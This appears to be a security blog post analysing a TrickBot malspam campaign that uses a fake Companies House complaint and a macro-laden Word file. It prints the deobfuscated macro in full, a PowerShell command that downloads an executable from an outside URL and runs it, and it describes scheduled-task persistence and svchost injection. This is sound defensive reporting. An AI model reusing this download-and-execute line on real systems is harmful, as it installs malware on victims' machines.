
	   
TrickBot is a relatively new bot discovered by Fidelis that executes commands from a command & control server on an infected computer. Today, a visitor (Thanks David!) submitted a malicious word document and its payload to our malware submission system. The malicious document is called Complaint.doc and contains macros that when activated will download and execute TrickBot on the affected computer.

The TrickBot SPAM email currently being sent has a subject of Companies House - new company complaint and pretends to be a complaint about the target's company that was filed with the the United Kingdom's registrar of companies called Companies House.


Companies House - new company complain SPAM

When the attachment is opened, it will display an alert stating that the target needs to click Enable Content in order to view the content of the document.


Malicious Word Document

Once the user clicks on the Enable Content button, the malicious macros contained in the document will execute to download and install TrickBot.  These obufscated malicious macros are shown below.

When we deobfuscate the above macros, we are left with a VB command that downloads and executes a file from the url: http://futuras.com/img/dododocdoc.exe.

Shell "cmd /c PowerShell (New-Object System.Net.WebClient).DownloadFile('http://futuras.com/img/dododocdoc.exe','%TMP%\sweezy.exe');" + "Start-Proocess '%TMP%\sweezy.exe';", 0


Once the file is downloaded, it will be saved in the %Temp% folder as sweezy.exe and executed. Once executed, it will copy itself to the %AppData% folder and inject a dll into Svchost.exe that will connect to command & control servers to download further plugins and receive commands to execute.


Injected Svchost Process

It will also create a Scheduled Task called Bot, which will routinely start the Sweezy.exe executable so that TrickBot is always running.

This campaign seems to be going strong and according to VirusTotal is not detected by many antivirus vendors at this point. Furthermore, this appears to be a global campaign as VirusTotal is showing scans of this Word document from many countries since 2016-11-02 11:52:04 UTC.

Be safe out there and if you receive an email similar to the one above, do not open it and immediately trash it.
